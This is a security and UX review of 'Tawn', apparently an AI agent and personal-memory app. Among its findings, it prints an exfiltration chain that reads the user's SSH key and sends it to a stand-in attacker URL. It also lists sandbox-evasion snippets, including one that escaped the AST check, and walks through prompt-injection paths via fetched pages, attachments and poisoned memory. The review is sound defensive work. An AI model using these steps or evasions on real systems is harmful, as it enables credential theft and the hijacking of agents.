# Tawn — end-to-end review

**Date:** 2026-07-27 · **Version:** 0.3.0 · **Scope:** stages 0–10, all uncommitted
**Reviewed:** 23,150 lines of Python across 155 modules, 7,413 lines of TypeScript,
13,848 lines of test across 120 files (1,153 passing).

---

## Verdict

The architecture is sound and unusually principled for its age. The capability
layer, the audit chain, the cost ledger, and the tiered honesty about
attribution and pricing are all genuinely good — they encode decisions most
projects make badly or not at all.

**But the system is one command away from publishing a user's entire personal
memory to the internet with no authentication, and the tool layer added in
Stage 10 turns that from a disclosure problem into a remote-code-execution
problem.** That is not a hypothetical: `tawn web start` opens the tunnel
automatically.

Everything else in this document is secondary to that.

---

## 1. Security

### 1.1 CRITICAL — `tawn web start` publishes everything, unauthenticated

`cli.py:507` calls `_start_ngrok(port)` unconditionally at the end of
`web start`. If `ngrok` is on PATH, a public HTTPS URL is created and printed.

There is **no authentication on any route**. A grep for `HTTPBearer`,
`Security(`, `verify_token`, `require_auth` across `src/tawn/web/` returns
nothing. All 39 mutating endpoints and every read endpoint are open.

Binding to `127.0.0.1` (`_webserver.py:143`) is correct and irrelevant — the
tunnel forwards to it.

**What an attacker with the URL can do today:**

| Endpoint | Effect |
|---|---|
| `GET /api/memory`, `POST /api/recall` | Read the entire compiled corpus |
| `GET /api/audit`, `/api/audit/export` | Read the full access history |
| `GET /api/observer/sessions/{id}/events` | See every file the user has touched |
| `PUT /api/grants` | **Rewrite the capability grants** |
| `POST /api/chat/stream` | Spend the owner's API budget without limit |
| `POST /api/tools/mcp/{name}/enable` | Enable an MCP server |
| `POST /api/tools/generated` + `/{name}/enable` | Generate and enable a tool |

### 1.2 CRITICAL — `PUT /api/grants` defeats the integrity check by design

```python
path.write_text(yaml.safe_dump(data, sort_keys=False))
digest = integrity_confirm(path)          # ← self-confirms
```

`grants.yaml` has a tamper-evident sidecar precisely so a hand edit must be
acknowledged with `tawn grant confirm`. The web handler writes the file *and
then confirms its own write*, so the control detects nothing. Combined with
§1.1, an unauthenticated caller can set `read: ["/"]` and have it look
perfectly legitimate.

**The escalation chain, end to end:**

```
tawn web start                     → public URL, no auth
PUT /api/grants  {"read": ["/"]}   → whole filesystem readable, self-confirmed
POST /api/chat/stream {tools:true} → read_file("/home/user/.ssh/id_rsa")
                                   → fetch_url("http://attacker/?d=…")
```

`read` and `net` are enough for full exfiltration. `shell` is *not* settable
through this endpoint (see §2.1), which is the only thing standing between
this and direct RCE.

### 1.3 CRITICAL — prompt injection has no boundary anywhere

You asked specifically about this. It is the deepest issue in the codebase,
and it is architectural rather than a bug.

**The loop** (`model/agent.py`): a tool result is appended to the conversation
and the model is immediately re-invoked **with the full tool set still
attached**. Whatever a tool returns is treated as ordinary conversation.

```
complete(convo, tools=specs) → tool_calls → execute() → append result → repeat
```

A grep for `untrusted`, `sanitiz`, `injection` across `model/` and `memory/`
returns nothing. There is no trust marking, no separation of instruction from
data, no allowlist on what a tool result may trigger.

**Five injection paths, all live:**

| # | Vector | How content arrives | Reaches tools? |
|---|---|---|---|
| 1 | **Web pages** | `fetch_url`, `web_search`, `deep_research` pull arbitrary HTML into context | Yes |
| 2 | **Attachments** | Any PDF/doc a user drags in (`ATTACHED DOCUMENTS` block, `chat.py:133`) | Yes |
| 3 | **Compiled memory** | `_recall_context` injects corpus text every turn — and the corpus is built from granted paths: repos, downloads, email exports | Yes |
| 4 | **MCP tool results** | A third-party server's return value | Yes |
| 5 | **Observer input** | File contents composed into review notes | Model-mediated |

**Path 1 is the sharpest.** `deep_research` fetches up to ~24 pages from
attacker-influenceable search results, concatenates them into the prompt, and
that prompt is answered by a model holding `read_file`, `write_file`,
`fetch_url`, and — if granted — `run_command`. A single crafted page reachable
by a plausible search query is a full exploit primitive.

**Path 3 is the most insidious**, because it needs no user action at all. If a
granted directory ever receives attacker-controlled text — one malicious file
in a cloned repo, one saved email — it is compiled into memory and then
*silently prepended to every future chat turn*.

**What exists today that helps:** generated tools are AST-verified and disabled
by default; MCP servers need two gates; management tools cannot self-enable.
Those are real and well-designed. **None of them constrain a model that has
already been given `run_command` legitimately.**

### 1.4 HIGH — `system: true` is settable over HTTP

`GrantsBody` exposes `system: bool`. Stage 9 does not read it yet, but the
field is writable by any unauthenticated caller and is the flag reserved for
full-machine awareness. It should not be reachable from the web at all.

### 1.5 MEDIUM — the generated-tool sandbox is not one, and the UI implies otherwise

`tools/creator.py` documents this honestly, and the `/tools` page says so.

The check holds up better than expected under test. All of these are caught:

| Attempt | Detected |
|---|---|
| `getattr(__import__("os"), "system")(...)` | `shell` |
| `eval("os.sys" + "tem")` | `shell` |
| `importlib.import_module("os").system(...)` | `shell` |
| `import subprocess as sp` (aliased) | `shell` |
| `from socket import socket as S` | `net` |
| `os.popen(...)` | `shell` |

One evasion did get through:

```python
def run(): getattr(__builtins__, "eval")("...")   # → declares nothing
```

`getattr` is not itself in `_CALL_CAPS`, so a lookup that never names a tracked
module or call escapes. Adding `getattr` and `globals` as `shell` would close
this at the cost of some false positives — the right trade, given the direction
the docs already commit to ("over-report rather than under").

The broader point stands regardless: this is a guard against mislabelling, not
a sandbox. An enabled tool runs in Tawn's process with Tawn's privileges. That
is documented; it should also appear at the moment of enabling, in stronger
terms than the current footnote.

### 1.6 MEDIUM — no rate limiting, request size cap, or spend ceiling

Nothing bounds `/api/chat/stream`. With §1.1, an attacker can exhaust the
owner's API budget. There is no per-session, per-day, or absolute spend cap
anywhere — the ledger *observes* cost faithfully but never *limits* it.

### 1.7 LOW — 26 silent exception handlers

`except Exception: pass` appears 26 times, concentrated in `cli.py` (7),
`parsing/extractors.py` (5), `_webserver.py` (3). Most are defensible
(best-effort background work). Several hide real failures — notably in the
background loop, where a persistently failing compile is indistinguishable from
a healthy one.

## 2. Functionality

### 2.1 BUG — saving grants from the web erases `net` and `shell`

`GrantsBody` was never updated when Stage 10 added the `net` and `shell`
capabilities. `put_grants` writes a dict containing only
`read/write/observe/system/mcp`, so:

> A user enables `net: true` by hand, opens Settings, changes anything, saves —
> and network tools silently stop working with no message.

Ironically this is also the only reason §1.2 is not already RCE.

### 2.2 BUG — `attachments.sweep()` is never called

Written, tested, exported — and no caller. Attachments accumulate in
`~/.tawn/attachments/` forever. Every PDF a user has ever dragged into chat
stays on disk indefinitely, in full extracted text.

### 2.3 GAP — model-tier parse depends on a model that may not exist

`parse_file(allow_model=True)` falls through to `default_router`, which on this
machine resolves to `tinyllama:1.1b` under `sensitive=True`. The tier-3 path
will produce nonsense rather than failing cleanly on a local-only setup.

### 2.4 GAP — tool generation is unusable on the default local model

Verified live: `tinyllama:1.1b` returns the prompt template verbatim. This is
now *detected* and reported with a pointer to `--cloud`, which is the right
behaviour — but the default experience is still failure. `tawn tool new` should
probably refuse up front when the resolved model is below a size threshold,
rather than spending two round trips to discover it.

### 2.5 GAP — Mistral pricing incomplete

`mistral-large-latest` verified from source; small/medium and the OCR endpoint
are absent, so those calls report as unpriced. Correct behaviour, known gap.

## 3. User experience

### 3.1 Destructive actions have no confirmation

Six delete/remove handlers across the frontend pages; **zero** `confirm()`
calls. Deleting a skill, a generated tool, an MCP server or a note is
immediate and irreversible. Notes in particular are user-authored content that
exists nowhere else.

### 3.2 Errors are swallowed rather than shown

**45** instances of `.catch(() => {})` across the frontend pages. When the backend fails,
the UI shows an empty state indistinguishable from "you have nothing yet". A
user whose database is down sees "no skills yet — write one", not an error.

This is the single biggest everyday-UX problem in the product.

### 3.3 The first-run experience assumes success

`tawn setup` is genuinely good — four steps, sensible defaults, honest about
what needs `sudo`. But the web UI has no equivalent: a fresh install lands on a
dashboard with empty cards and no guidance toward "grant something, then
compile".

### 3.4 Long operations have no progress

`compile`, `enrich`, and `reembed` can run for hours. The CLI reports; the web
UI does not. A user clicking "enrich" in the browser gets no feedback that
anything is happening.

### 3.5 What is genuinely good

Worth recording, because it should not be lost in a refactor:

- **Honest degradation throughout.** Unpriced calls are labelled, not hidden.
  Low-confidence attribution reads "likely". Missing OCR names the package to
  install. Stale caches announce staleness. This is rare and valuable.
- **The two-gate model** (enabled *and* granted) with the UI naming which gate
  is closed.
- **The tool trace in chat** — expandable, showing arguments and results. Most
  products hide this.
- **Parse-on-attach** with format and size shown on the pill.
- **The new sidebar grouping** gives the product a shape it did not have.

## 4. What to do, in order

### Immediately — before this is ever exposed

1. **Do not auto-start ngrok.** Make it `tawn web start --public`, and refuse
   that flag entirely until auth exists. *(One line.)*
2. **Remove `system` from `GrantsBody`;** add `net` and `shell` so saving stops
   erasing them. *(Fixes §1.4 and §2.1 together.)*
3. **Require `tawn grant confirm` for web grant edits** — write the file,
   do *not* self-confirm, return "confirm from the CLI". Restores the control.
4. **Wire `attachments.sweep()`** into the 30-minute background loop.

### Stage 11, before any sharing ships

5. **Authentication on every route**, owner key and guest key, as specced.
6. **A spend ceiling** that disables chat rather than billing indefinitely.
7. **Rate limiting** on key exchange and chat.

### The injection boundary — its own piece of work

8. **Mark untrusted content structurally.** Wrap tool results, fetched pages,
   attachments and recalled memory in an explicit envelope the system prompt
   teaches the model to treat as data, never instruction.
9. **Restrict the tool set after untrusted content enters a turn.** Once
   `fetch_url` or `deep_research` has run, drop `run_command` and `write_file`
   from the registry for the remainder of that turn. This is the single highest
   value mitigation available and it is a change to one function
   (`ToolRegistry.build` / the loop in `agent.py`).
10. **Require confirmation for side-effecting tool calls** that follow
    untrusted input — the pattern this very session runs under.

### Everyday quality

11. **Surface errors in the UI.** Replace `.catch(() => {})` with a shared
    error banner. Biggest UX win per line changed.
12. **Confirm destructive actions.**
13. **Progress for long operations** over the existing SSE channel.
14. **A first-run checklist** on the dashboard until the first compile lands.

## 5. One structural observation

The capability layer was designed when Tawn only *read* files. Stage 10 gave it
the ability to *act* — shell, network, code generation, third-party servers —
and the grant model was extended (`net`, `shell`) without revisiting its
premise.

Grants answer **"what may Tawn touch?"**. They do not answer **"what may Tawn
do in response to content it did not author?"** — and once a model can both
read attacker-influenceable text and take actions, that second question is the
one that matters.

That is worth a deliberate design pass before Stage 11 adds public access on
top of it.
